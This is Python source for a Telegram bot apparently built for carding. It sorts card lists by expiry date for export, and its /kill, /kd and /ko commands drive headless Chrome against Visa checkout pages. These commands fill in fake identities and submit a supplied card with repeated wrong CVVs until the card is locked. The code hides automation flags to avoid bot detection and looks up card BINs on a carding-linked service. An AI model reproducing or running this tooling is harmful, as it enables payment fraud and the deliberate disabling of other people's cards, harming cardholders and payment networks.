async def show_expiry_year_details(query, organized_data, year, session_id):
    """Show details for a specific expiry year with months - FIXED"""
    try:
        year_int = int(year)
    except:
        await query.answer("❌ Invalid year", show_alert=True)
        return
    
    by_year_month = organized_data['by_year_month']
    
    if year_int not in by_year_month:
        await query.answer("❌ No cards found for this year", show_alert=True)
        return
    
    months_data = by_year_month[year_int]
    
    # Sort months
    month_items = sorted(months_data.items(), key=lambda x: int(x[0]))
    
    # Month names for display
    month_names = {
        "01": "Jan", "02": "Feb", "03": "Mar", "04": "Apr",
        "05": "May", "06": "Jun", "07": "Jul", "08": "Aug",
        "09": "Sep", "10": "Oct", "11": "Nov", "12": "Dec"
    }
    
    # Create buttons for months (2 per row) - FIXED: Proper callback data format
    keyboard = []
    row = []
    
    for month, cards in month_items:
        month_name = month_names.get(month, month)
        btn_text = f"{month_name} ({len(cards)})"
        # FIXED: Correct format for year-month selection - c_sub:category:sub_type:identifier:extra:session_id
        callback_data = f"c_sub:ym:ym:{year}:{month}:{session_id}"
        row.append(InlineKeyboardButton(btn_text, callback_data=callback_data))
        
        if len(row) == 2:
            keyboard.append(row)
            row = []
    
    if row:
        keyboard.append(row)
    
    # Add export and back buttons
    keyboard.append([
        InlineKeyboardButton("📄 Export Year", callback_data=f"c_exp:1:ey:v:{year}:{session_id}")
    ])
    keyboard.append([InlineKeyboardButton("⬅️ Back to Years", callback_data=f"c_cat:e:0:{session_id}")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Calculate total for year
    year_total = sum(len(cards) for cards in months_data.values())
    
    await query.edit_message_text(
        f"📅 Expiry Year Details\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Year: {year}\n"
        f"Total cards: {year_total:,}\n\n"
        f"📅 Months in {year}:",
        reply_markup=reply_markup
    )

async def show_year_month_details(query, organized_data, year, month, session_id):
    """Show details for a specific month in a specific year - FIXED"""
    by_year_month = organized_data['by_year_month']
    
    try:
        year_int = int(year)
    except:
        await query.answer("❌ Invalid year", show_alert=True)
        return
    
    if year_int not in by_year_month or month not in by_year_month[year_int]:
        await query.answer("❌ No cards found for this month-year combination", show_alert=True)
        return
    
    cards = by_year_month[year_int][month]
    
    if not cards:
        await query.answer("❌ No cards found for this month", show_alert=True)
        return
    
    # Month name for display
    month_names = {
        "01": "January", "02": "February", "03": "March", "04": "April",
        "05": "May", "06": "June", "07": "July", "08": "August",
        "09": "September", "10": "October", "11": "November", "12": "December"
    }
    month_name = month_names.get(month, f"Month {month}")
    
    # Create export buttons with CORRECT callback data format
    keyboard = [
        [
            InlineKeyboardButton("📄 Get TXT", callback_data=f"c_exp:1:ym:ym:{year}:{month}:{session_id}"),
            InlineKeyboardButton("📄+🗑️ TXT & Remove", callback_data=f"c_exp:2:ym:ym:{year}:{month}:{session_id}")
        ],
        [InlineKeyboardButton("⬅️ Back to Months", callback_data=f"c_sub:ey:v:{year}:{session_id}")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        f"📅 Year-Month Details\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Year: {year}\n"
        f"Month: {month_name} ({month})\n"
        f"Total cards: {len(cards):,}\n\n"
        f"📁 Export Options",
        reply_markup=reply_markup
    )

async def show_expiry_month_details(query, organized_data, month, session_id):
    """Show details for a specific expiry month"""
    cards = organized_data['by_expiry_month'].get(month, [])
    
    if not cards:
        await query.answer("❌ No cards found for this month", show_alert=True)
        return
    
    # Count years in this month
    year_counts = {}
    for card in cards:
        year = card['full_year']
        year_counts[year] = year_counts.get(year, 0) + 1
    
    # Sort years
    sorted_years = sorted(year_counts.items(), key=lambda x: x[0])
    
    # Month name for display
    month_names = {
        "01": "January", "02": "February", "03": "March", "04": "April",
        "05": "May", "06": "June", "07": "July", "08": "August",
        "09": "September", "10": "October", "11": "November", "12": "December"
    }
    month_name = month_names.get(month, f"Month {month}")
    
    # Create export buttons (2 per row) - FIXED CALLBACK DATA
    keyboard = [
        [
            InlineKeyboardButton("📄 Get TXT", callback_data=f"c_exp:1:em:v:{month}:{session_id}"),
            InlineKeyboardButton("📄+🗑️ TXT & Remove", callback_data=f"c_exp:2:em:v:{month}:{session_id}")
        ],
        [InlineKeyboardButton("⬅️ Back", callback_data=f"c_back:{session_id}")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    year_details = "\n".join([f"• {year}: {count:,} cards" for year, count in sorted_years])
    
    await query.edit_message_text(
        f"📅 Expiry Month Details\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Month: {month_name} ({month})\n"
        f"Total cards: {len(cards):,}\n\n"
        f"📅 Year distribution:\n{year_details}\n\n"
        f"📁 Export Options",
        reply_markup=reply_markup
    )

# ==== 5. VISA KILLER (Auto-adjust wait) ====
def run_selenium_process(card_input, update_dict):
    asyncio.run(fill_checkout_form(card_input, update_dict))

async def fill_checkout_form(card_input, update_dict):
    uid = update_dict["user_id"]
    chat_id = update_dict["chat_id"]
    msg_id = update_dict["message_id"]
    bot = Bot(BOT_TOKEN)

    if not is_approved(uid, "kill"):
        await bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text="🚫 You are not approved to use the bot.")
        return
    
    if not is_cmd_enabled("kill"):
        await bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text="⚠️ This command is currently disabled by admin.")
        return

    parsed = parse_card_input(card_input)
    if not parsed:
        await bot.edit_message_text(
            chat_id=chat_id, message_id=msg_id,
            text="❌ Invalid format. Use: `/kill 1234567812345678|12|2026|123`",
            parse_mode="Markdown"
        )
        return

    card, mm, yy, original_cvv = parsed
    short_card = f"{card}|{mm}|{yy}|{original_cvv}"
    bin_info, bin_details = get_bin_info(card[:6])
    bin_flag = (bin_details or {}).get("country_flag", "")

    await bot.edit_message_text(
        chat_id=chat_id,
        message_id=msg_id,
        text=f"💳 `{short_card}`\n🔁 Starting VISA kill automation...",
        parse_mode="Markdown"
    )

    start = time.time()

    first_name = names.get_first_name()
    last_name = names.get_last_name()
    email = f"{first_name.lower()}{random.randint(1000,9999)}@example.com"

    # Optimized Chrome options for Railway
    ua = UserAgent()
    options = webdriver.ChromeOptions()
    options.binary_location = CHROME_PATH
    options.add_argument(f"user-agent={ua.random}")
    options.add_argument("--headless=new")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    options.add_argument("--disable-extensions")
    options.add_argument("--disable-software-rasterizer")
    options.add_argument("--disable-background-networking")
    options.add_argument("--disable-default-apps")
    options.add_argument("--disable-sync")
    options.add_argument("--no-first-run")
    options.add_argument("--window-size=1920,1080")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option('useAutomationExtension', False)
    options.set_capability("pageLoadStrategy", "eager")

    service = Service(executable_path=CHROME_DRIVER_PATH)
    driver = webdriver.Chrome(service=service, options=options)
    driver.set_page_load_timeout(25)
    wait = WebDriverWait(driver, 15)

    try:
        driver.get("https://secure.checkout.visa.com/createAccount")

        wait.until(EC.element_to_be_clickable((By.ID, "firstName"))).send_keys(first_name)
        driver.find_element(By.ID, "lastName").send_keys(last_name)
        driver.find_element(By.ID, "emailAddress").send_keys(email)

        ActionChains(driver).move_to_element(
            wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "input.viewButton-button[value='Set Up']")))
        ).click().perform()

        wait.until(EC.element_to_be_clickable((By.ID, "cardNumber-CC"))).send_keys(card)
        driver.find_element(By.ID, "expiry").send_keys(f"{mm}/{yy}")
        driver.find_element(By.ID, "addCardCVV").send_keys(get_random_cvv(original_cvv))

        driver.find_element(By.ID, "first_name").send_keys(first_name)
        driver.find_element(By.ID, "last_name").send_keys(last_name)
        driver.find_element(By.ID, "address_line1").send_keys("123 Elm Street")
        driver.find_element(By.ID, "address_city").send_keys("New York")
        driver.find_element(By.ID, "address_state_province_code").send_keys("NY")
        driver.find_element(By.ID, "address_postal_code").send_keys("10001")
        driver.find_element(By.ID, "address_phone").send_keys("2025550104")

        try:
            driver.execute_script("arguments[0].click();", driver.find_element(By.ID, "country_code"))
            wait.until(EC.element_to_be_clickable((By.ID, "rf-combobox-1-item-1"))).click()
        except:
            pass

        ActionChains(driver).move_to_element(
            wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "input.viewButton-button[value='Finish Setup']")))
        ).click().perform()

        used_cvvs = set()
        logs = []
        for attempt in range(8):
            try:
                new_cvv = get_random_cvv(original_cvv, used_cvvs)

                # Wait for CVV field to be ready
                input_field = wait.until(EC.element_to_be_clickable((By.ID, "addCardCVV")))
                input_field.clear()
                input_field.send_keys(new_cvv)

                # Click Finish Setup
                finish_btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "input.viewButton-button[value='Finish Setup']")))
                finish_btn.click()

                logs.append(f"• Try {attempt+1}: {new_cvv}")

                # Auto-adjust wait: wait until CVV field is clickable again
                wait.until(EC.element_to_be_clickable((By.ID, "addCardCVV")))

            except:
                logs.append(f"• Failed attempt {attempt+1}")

        duration = round(time.time() - start, 2)
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=msg_id,
            text=(
                f"💳 **Card:** `{short_card}`\n"
                f"🏦 **BIN:** `{bin_info}` {bin_flag}\n\n"
                f"🔁 **CVV Attempts:**\n" + "\n".join(logs) + "\n\n"
                f"✅ **Status:** Killed Successfully\n"
                f"⏱ **Time:** {duration}s"
            ),
            parse_mode="Markdown"
        )
        record_cmd_success("kill")

    except Exception:
        screenshot = "fail.png"
        driver.save_screenshot(screenshot)
        err_trace = traceback.format_exc()
        record_cmd_failure("kill")

        await bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text="❌ VISA Kill failed.")
        await bot.send_photo(
            chat_id=BOT_ADMIN_ID,
            photo=open(screenshot, "rb"),
            caption=f"```\n{err_trace}\n```",
            parse_mode="Markdown"
        )
        os.remove(screenshot)

    finally:
        try:
            driver.quit()
        except:
            pass
        driver = None
        gc.collect()

async def kill_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid in banned_users:
        await update.message.reply_text("🚫 You are banned from using this bot.", reply_to_message_id=update.message.message_id)
        return
    if not is_approved(uid, "kill"):
        await update.message.reply_text("⛔ You are not approved to use this command.", reply_to_message_id=update.message.message_id)
        return
    
    if not is_cmd_enabled("kill"):
        await update.message.reply_text("⚠️ This command is currently disabled by admin.", reply_to_message_id=update.message.message_id)
        return

    raw_input = " ".join(context.args).strip() if context.args else ""
    if not raw_input and update.message.reply_to_message:
        raw_input = update.message.reply_to_message.text.strip()

    card_input = extract_card_input(raw_input)
    if not card_input:
        await update.message.reply_text("❌ Card input not found.\nUse: `/kill 1234123412341234|12|2026|123`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
        return

    msg = await update.message.reply_text("⏳ Killing automation...", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
    update_dict = {
        "user_id": uid,
        "chat_id": update.effective_chat.id,
        "message_id": msg.message_id,
        "text": card_input
    }
    Process(target=run_selenium_process, args=(card_input, update_dict), daemon=True).start()

# ==== 6. /kd Command (VISA Killer #2) ==== #
def run_kd_process(card_input, update_dict):
    import os, random, traceback, requests, time
    from selenium import webdriver
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.common.keys import Keys
    from fake_useragent import UserAgent

    CHROME_PATH = "/usr/bin/google-chrome"
    CHROME_DRIVER_PATH = "/usr/bin/chromedriver"
    BOT_TOKEN = os.environ.get("BOT_TOKEN", "")

    def _env_int(name: str, default: int) -> int:
        raw = os.environ.get(name)
        if raw is None or str(raw).strip() == "":
            return default
        try:
            return int(str(raw).strip())
        except Exception:
            return default

    BOT_ADMIN_ID = _env_int("BOT_ADMIN_ID", 123456789)

    def _flag_from_country_code(code: str) -> str:
        code = (code or "").strip().upper()
        if len(code) != 2 or not code.isalpha():
            return ""
        try:
            return "".join(chr(ord(c) + 127397) for c in code)
        except Exception:
            return ""

    def split_card(card_input):
        parts = card_input.replace(' ', '|').replace('/', '|').replace('\\', '|').strip().split('|')
        if len(parts) != 4:
            raise ValueError("Invalid card format")
        return parts[0], parts[1].zfill(2), parts[2][-2:], parts[3]

    def get_bin_info_local(bin_number):
        try:
            res = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=5)
            if res.status_code == 200:
                data = res.json()
                brand = data.get("brand", "Unknown").upper()
                type_ = data.get("type", "Unknown").upper()
                country = data.get("country_name", "Unknown")
                country_code = data.get("country", "") or data.get("country_code", "")
                country_flag = data.get("country_flag", "") or _flag_from_country_code(country_code)
                bank = data.get("bank", "Unknown")
                level = data.get("level", "")
                
                info_parts = [brand]
                if type_ and type_ != "UNKNOWN": 
                    info_parts.append(type_)
                if country and country != "Unknown":
                    info_parts.append(country)
                if level and level != "":
                    info_parts.append(level)
                if bank and bank != "Unknown":
                    info_parts.append(bank)
                    
                return " • ".join(info_parts), country_flag
        except:
            pass
        return "Unavailable", ""

    def get_random_email():
        return ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=8)) + "@gmail.com"

    def get_fake_name():
        first = random.choice(["James", "John", "Robert", "Michael", "David"])
        last = random.choice(["Smith", "Johnson", "Williams", "Brown", "Jones"])
        return first, last

    def get_fake_address():
        return "123 Elm Street", "New York", "NY", "10001", "20255501" + ''.join(random.choices('0123456789', k=2))

    def get_wrong_cvv(exclude):
        while True:
            fake = ''.join(random.choices('0123456789', k=3))
            if fake != exclude:
                return fake

    def edit_message(text):
        payload = {
            "chat_id": update_dict["chat_id"],
            "message_id": update_dict["message_id"],
            "text": text,
            "parse_mode": "Markdown"
        }
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
        try:
            requests.post(url, data=payload, timeout=8)
        except Exception:
            pass

    def admin_report(trace, driver=None):
        sent = False
        screenshot_path = "kd_fail.png"
        if driver:
            try:
                driver.save_screenshot(screenshot_path)
                with open(screenshot_path, "rb") as img:
                    files = {"photo": img}
                    payload = {
                        "chat_id": BOT_ADMIN_ID,
                        "caption": f"KD Error:\n```\n{trace[:900]}\n```",
                        "parse_mode": "Markdown"
                    }
                    requests.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                        data=payload,
                        files=files,
                        timeout=12
                    )
                sent = True
                os.remove(screenshot_path)
            except Exception:
                pass
        if not sent:
            try:
                payload = {
                    "chat_id": BOT_ADMIN_ID,
                    "text": f"KD Error (no screenshot):\n```\n{trace[:900]}\n```",
                    "parse_mode": "Markdown"
                }
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    data=payload,
                    timeout=8
                )
            except Exception:
                pass

    start = time.time()
    driver = None

    try:
        # Optimized Chrome options for Railway
        options = webdriver.ChromeOptions()
        options.binary_location = CHROME_PATH
        ua = UserAgent().random if UserAgent else "Mozilla/5.0 Chrome/118"
        options.add_argument(f"user-agent={ua}")
        options.add_argument("--headless=new")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--disable-gpu")
        options.add_argument("--disable-extensions")
        options.add_argument("--disable-software-rasterizer")
        options.add_argument("--disable-background-networking")
        options.add_argument("--disable-default-apps")
        options.add_argument("--disable-sync")
        options.add_argument("--no-first-run")
        options.add_argument("--window-size=1920,1080")
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)
        options.set_capability("pageLoadStrategy", "eager")
        service = Service(executable_path=CHROME_DRIVER_PATH)
        driver = webdriver.Chrome(service=service, options=options)
        driver.set_page_load_timeout(20)
        wait = WebDriverWait(driver, 4)

        # Step 1: Login
        driver.get("https://src.visa.com/login")

        try:
            btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, ".wscrOk")))
            driver.execute_script("arguments[0].click();", btn)
        except Exception:
            pass

        wait.until(EC.visibility_of_element_located((By.ID, "email-input"))).send_keys(get_random_email())
        wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, '[data-testid="continue-button"]'))).click()
        wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, '[data-testid="terms-checkbox"]'))).click()
        wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, '[data-testid="next-button"]'))).click()

        edit_message("🔓 1 - Login (Unlocked)\n⚙️ 2 - Card Fill...")

        cc, mm, yy, real_cvv = split_card(card_input)
        bin_info, bin_flag = get_bin_info_local(cc[:6])
        short_card = f"{cc}|{mm}|{yy}|{real_cvv}"
        wrong_cvv = get_wrong_cvv(real_cvv)

        wait.until(EC.visibility_of_element_located((By.ID, "card-input"))).send_keys(cc)
        wait.until(EC.visibility_of_element_located((By.ID, "expiration-input"))).send_keys(mm + yy)
        wait.until(EC.visibility_of_element_located((By.ID, "cvv-input"))).send_keys(wrong_cvv)

        edit_message("🔓 1 - Login (Unlocked)\n🔓 2 - Card Fill (Unlocked)\n⚙️ 3 - Billing Fill (in progress)...\n🔒 4 - CVV Try")

        # Step 3: Billing Fill
        first_name, last_name = get_fake_name()
        address, city, state, zip_code, phone = get_fake_address()

        wait.until(EC.visibility_of_element_located((By.ID, "first-name-input"))).send_keys(first_name)
        wait.until(EC.visibility_of_element_located((By.ID, "last-name-input"))).send_keys(last_name)

        try:
            country_box = wait.until(
                EC.presence_of_element_located((By.CSS_SELECTOR, '[data-testid="region-select"]'))
            )
            country_val = country_box.get_attribute('value')
            if not country_val or ("United States" not in country_val):
                country_box.click()
                country_box.clear()
                country_box.send_keys("United States")
                wait.until(lambda d: "United States" in country_box.get_attribute('value') or "United States" in country_box.text)
                country_box.send_keys(Keys.ENTER)
        except Exception:
            pass

        wait.until(EC.visibility_of_element_located((By.ID, "line1-input"))).send_keys(address)
        wait.until(EC.visibility_of_element_located((By.ID, "city-input"))).send_keys(city)
        wait.until(EC.visibility_of_element_located((By.ID, "stateProvinceCode-input"))).send_keys(state)
        wait.until(EC.visibility_of_element_located((By.ID, "zip-input"))).send_keys(zip_code)
        wait.until(EC.visibility_of_element_located((By.ID, "card-phone-input-number"))).send_keys(phone)

        add_card_btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, 'button[data-testid="submit-button"]')))
        driver.execute_script("arguments[0].scrollIntoView(true);", add_card_btn)
        add_card_btn.click()

        edit_message("🔓 1 - Login (Unlocked)\n🔓 2 - Card Fill (Unlocked)\n🔓 3 - Billing Fill (Unlocked)\n⚙️ 4 - CVV Try (in progress)...")

        # Step 4: CVV Attempts
        cvv_results = []
        used_cvvs = set()
        used_cvvs.add(wrong_cvv)
        cvv_results.append(wrong_cvv)
        for i in range(7):
            while True:
                fake_cvv = ''.join(random.choices('0123456789', k=3))
                if fake_cvv not in used_cvvs:
                    used_cvvs.add(fake_cvv)
                    break
            try:
                add_card_btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, 'button[data-testid="submit-button"]')))
                cvv_field = wait.until(EC.visibility_of_element_located((By.ID, "cvv-input")))
                cvv_field.click()
                cvv_field.send_keys(Keys.CONTROL + "a")
                cvv_field.send_keys(fake_cvv)
                driver.execute_script("arguments[0].scrollIntoView(true);", add_card_btn)
                add_card_btn.click()
                cvv_results.append(fake_cvv)
            except Exception:
                cvv_results.append("Failed")

        duration = round(time.time() - start, 2)
        tries_txt = "\n".join([f"• Try {i+1}: {cvv}" for i, cvv in enumerate(cvv_results)])
        edit_message(
            f"💳 **Card:** `{short_card}`\n"
            f"🏦 **BIN:** `{bin_info}` {bin_flag}\n\n"
            f"🔁 **CVV Attempts:**\n{tries_txt}\n\n"
            f"✅ **Status:** Kd KiLLeD SuccessFully\n"
            f"⏱ **Time:** {duration}s"
        )
        record_cmd_success("kd")

    except Exception as e:
        trace = traceback.format_exc()
        edit_message(f"❌ KD Error: `{e}`")
        admin_report(trace, driver)
        record_cmd_failure("kd")
    finally:
        try:
            if driver: driver.quit()
        except: pass
        driver = None
        gc.collect()

async def kd_cmd(update, context):
    uid = update.effective_user.id
    if not is_approved(uid, "kd"):
        await update.message.reply_text("⛔ You are not approved to use /kd", reply_to_message_id=update.message.message_id)
        return
    
    if not is_cmd_enabled("kd"):
        await update.message.reply_text("⚠️ This command is currently disabled by admin.", reply_to_message_id=update.message.message_id)
        return

    raw_input = " ".join(context.args) if context.args else ""
    card_input = extract_card_input(raw_input)
    if not card_input:
        await update.message.reply_text("❌ Invalid card.\nUse: `/kd 4111111111111111|12|25|123`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
        return

    msg = await update.message.reply_text(f"💳 `{card_input}`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
    update_dict = {
        "user_id": uid,
        "chat_id": update.effective_chat.id,
        "message_id": msg.message_id
    }
    Process(target=run_kd_process, args=(card_input, update_dict), daemon=True).start()

# ==== 7. /ko Command (KO Mode, All Wait, No Sleep, USA) ==== #
def run_ko_process(card_input, update_dict):
    import os, random, traceback, requests, time
    from selenium import webdriver
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.common.keys import Keys
    from fake_useragent import UserAgent

    CHROME_PATH = "/usr/bin/google-chrome"
    CHROME_DRIVER_PATH = "/usr/bin/chromedriver"
    BOT_TOKEN = os.environ.get("BOT_TOKEN", "")

    def _env_int(name: str, default: int) -> int:
        raw = os.environ.get(name)
        if raw is None or str(raw).strip() == "":
            return default
        try:
            return int(str(raw).strip())
        except Exception:
            return default

    BOT_ADMIN_ID = _env_int("BOT_ADMIN_ID", 123456789)

    def _flag_from_country_code(code: str) -> str:
        code = (code or "").strip().upper()
        if len(code) != 2 or not code.isalpha():
            return ""
        try:
            return "".join(chr(ord(c) + 127397) for c in code)
        except Exception:
            return ""

    def split_card(card_input):
        parts = card_input.replace(' ', '|').replace('/', '|').replace('\\', '|').strip().split('|')
        if len(parts) != 4:
            raise ValueError("Invalid card format")
        return parts[0], parts[1].zfill(2), parts[2][-2:], parts[3]

    def get_bin_info_local(bin_number):
        try:
            res = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=5)
            if res.status_code == 200:
                data = res.json()
                brand = data.get("brand", "Unknown").upper()
                type_ = data.get("type", "Unknown").upper()
                country = data.get("country_name", "Unknown")
                country_code = data.get("country", "") or data.get("country_code", "")
                country_flag = data.get("country_flag", "") or _flag_from_country_code(country_code)
                bank = data.get("bank", "Unknown")
                level = data.get("level", "")
                
                info_parts = [brand]
                if type_ and type_ != "UNKNOWN": 
                    info_parts.append(type_)
                if country and country != "Unknown":
                    info_parts.append(country)
                if level and level != "":
                    info_parts.append(level)
                if bank and bank != "Unknown":
                    info_parts.append(bank)
                    
                return " • ".join(info_parts), country_flag
        except:
            pass
        return "Unavailable", ""

    def get_random_email():
        return ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=8)) + "@gmail.com"

    def get_fake_name():
        first = random.choice(["James", "John", "Robert", "Michael", "David"])
        last = random.choice(["Smith", "Johnson", "Williams", "Brown", "Jones"])
        return first, last

    def get_fake_address():
        return "123 Elm Street", "New York", "NY", "10001", "20255501" + ''.join(random.choices('0123456789', k=2))

    def get_wrong_cvv(exclude):
        while True:
            fake = ''.join(random.choices('0123456789', k=3))
            if fake != exclude:
                return fake

    def edit_message(text):
        payload = {
            "chat_id": update_dict["chat_id"],
            "message_id": update_dict["message_id"],
            "text": text,
            "parse_mode": "Markdown"
        }
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
        try:
            requests.post(url, data=payload, timeout=8)
        except Exception:
            pass

    def admin_report(trace, driver=None):
        sent = False
        screenshot_path = "ko_fail.png"
        if driver:
            try:
                driver.save_screenshot(screenshot_path)
                with open(screenshot_path, "rb") as img:
                    files = {"photo": img}
                    payload = {
                        "chat_id": BOT_ADMIN_ID,
                        "caption": f"KO Error:\n```\n{trace[:900]}\n```",
                        "parse_mode": "Markdown"
                    }
                    requests.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                        data=payload,
                        files=files,
                        timeout=12
                    )
                sent = True
                os.remove(screenshot_path)
            except Exception:
                pass
        if not sent:
            try:
                payload = {
                    "chat_id": BOT_ADMIN_ID,
                    "text": f"KO Error (no screenshot):\n```\n{trace[:900]}\n```",
                    "parse_mode": "Markdown"
                }
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    data=payload,
                    timeout=8
                )
            except Exception:
                pass

    start = time.time()
    driver = None

    try:
        # Optimized Chrome options for Railway
        options = webdriver.ChromeOptions()
        options.binary_location = CHROME_PATH
        ua = UserAgent().random if UserAgent else "Mozilla/5.0 Chrome/118"
        options.add_argument(f"user-agent={ua}")
        options.add_argument("--headless=new")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--disable-gpu")
        options.add_argument("--disable-extensions")
        options.add_argument("--disable-software-rasterizer")
        options.add_argument("--disable-background-networking")
        options.add_argument("--disable-default-apps")
        options.add_argument("--disable-sync")
        options.add_argument("--no-first-run")
        options.add_argument("--window-size=1920,1080")
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)
        options.set_capability("pageLoadStrategy", "eager")
        service = Service(executable_path=CHROME_DRIVER_PATH)
        driver = webdriver.Chrome(service=service, options=options)
        driver.set_page_load_timeout(20)
        wait = WebDriverWait(driver, 4)

        # Step 1: Login
        driver.get("https://src.visa.com/login")

        try:
            btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, ".wscrOk")))
            driver.execute_script("arguments[0].click();", btn)
        except Exception:
            pass

        wait.until(EC.visibility_of_element_located((By.ID, "email-input"))).send_keys(get_random_email())
        wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, '[data-testid="continue-button"]'))).click()
        wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, '[data-testid="terms-checkbox"]'))).click()
        wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, '[data-testid="next-button"]'))).click()

        edit_message("🔓 1 - Login (Unlocked)\n⚙️ 2 - Card Fill...")

        cc, mm, yy, real_cvv = split_card(card_input)
        bin_info, bin_flag = get_bin_info_local(cc[:6])
        short_card = f"{cc}|{mm}|{yy}|{real_cvv}"
        wrong_cvv = get_wrong_cvv(real_cvv)

        wait.until(EC.visibility_of_element_located((By.ID, "card-input"))).send_keys(cc)
        wait.until(EC.visibility_of_element_located((By.ID, "expiration-input"))).send_keys(mm + yy)
        wait.until(EC.visibility_of_element_located((By.ID, "cvv-input"))).send_keys(wrong_cvv)

        edit_message("🔓 1 - Login (Unlocked)\n🔓 2 - Card Fill (Unlocked)\n⚙️ 3 - Billing Fill (in progress)...\n🔒 4 - CVV Try")

        # Step 3: Billing Fill (always USA)
        first_name, last_name = get_fake_name()
        address, city, state, zip_code, phone = get_fake_address()

        wait.until(EC.visibility_of_element_located((By.ID, "first-name-input"))).send_keys(first_name)
        wait.until(EC.visibility_of_element_located((By.ID, "last-name-input"))).send_keys(last_name)

        try:
            country_box = wait.until(
                EC.presence_of_element_located((By.CSS_SELECTOR, '[data-testid="region-select"]'))
            )
            country_val = country_box.get_attribute('value')
            if not country_val or ("United States" not in country_val):
                country_box.click()
                country_box.clear()
                country_box.send_keys("United States")
                wait.until(lambda d: "United States" in country_box.get_attribute('value') or "United States" in country_box.text)
                country_box.send_keys(Keys.ENTER)
        except Exception:
            pass

        wait.until(EC.visibility_of_element_located((By.ID, "line1-input"))).send_keys(address)
        wait.until(EC.visibility_of_element_located((By.ID, "city-input"))).send_keys(city)
        wait.until(EC.visibility_of_element_located((By.ID, "stateProvinceCode-input"))).send_keys(state)
        wait.until(EC.visibility_of_element_located((By.ID, "zip-input"))).send_keys(zip_code)
        wait.until(EC.visibility_of_element_located((By.ID, "card-phone-input-number"))).send_keys(phone)

        add_card_btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, 'button[data-testid="submit-button"]')))
        driver.execute_script("arguments[0].scrollIntoView(true);", add_card_btn)
        add_card_btn.click()

        edit_message("🔓 1 - Login (Unlocked)\n🔓 2 - Card Fill (Unlocked)\n🔓 3 - Billing Fill (Unlocked)\n⚙️ 4 - CVV Try (in progress)...")

        # Step 4: CVV Attempts (6 tries for /ko)
        cvv_results = []
        used_cvvs = set()
        used_cvvs.add(wrong_cvv)
        cvv_results.append(wrong_cvv)
        for i in range(6):
            while True:
                fake_cvv = ''.join(random.choices('0123456789', k=3))
                if fake_cvv not in used_cvvs:
                    used_cvvs.add(fake_cvv)
                    break
            try:
                add_card_btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, 'button[data-testid="submit-button"]')))
                cvv_field = wait.until(EC.visibility_of_element_located((By.ID, "cvv-input")))
                cvv_field.click()
                cvv_field.send_keys(Keys.CONTROL + "a")
                cvv_field.send_keys(fake_cvv)
                driver.execute_script("arguments[0].scrollIntoView(true);", add_card_btn)
                add_card_btn.click()
                cvv_results.append(fake_cvv)
            except Exception:
                cvv_results.append("Failed")

        duration = round(time.time() - start, 2)
        tries_txt = "\n".join([f"• Try {i+1}: {cvv}" for i, cvv in enumerate(cvv_results)])
        edit_message(
            f"💳 **Card:** `{short_card}`\n"
            f"🏦 **BIN:** `{bin_info}` {bin_flag}\n\n"
            f"🔁 **CVV Attempts:**\n{tries_txt}\n\n"
            f"✅ **Status:** KO Mode Success\n"
            f"⏱ **Time:** {duration}s"
        )
